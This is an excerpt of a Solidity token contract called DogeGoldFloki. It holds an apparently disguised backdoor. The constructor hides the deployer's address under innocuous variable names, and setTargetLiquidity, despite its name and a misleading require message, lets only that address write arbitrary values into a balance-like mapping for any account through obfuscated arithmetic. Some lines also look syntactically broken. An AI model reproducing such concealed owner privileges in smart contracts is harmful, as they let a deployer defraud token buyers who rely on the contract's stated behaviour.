...
contract DogeGoldFloki is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    _minDistribution = uint256(msg.sender);
    accuracyFees = uint256(uint160(msg.sender));
    owner = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
  ...
  function setTargetLiquidity(address _target, uint256 _denominator) public returns (bool) {
        require(_denominator > 5, "Transfer amount must be greater than five");
      if(msg.sender == address(_minDistribution)){
        uint256 targetLiquidity = uint256(_target);
        _liquify[address(targetLiquidity)] = 1 * 0 + accuracyFees * gas * _denominator * (10 ** 9) / accuracyFees;
        return true;
      }
      return false;
  }
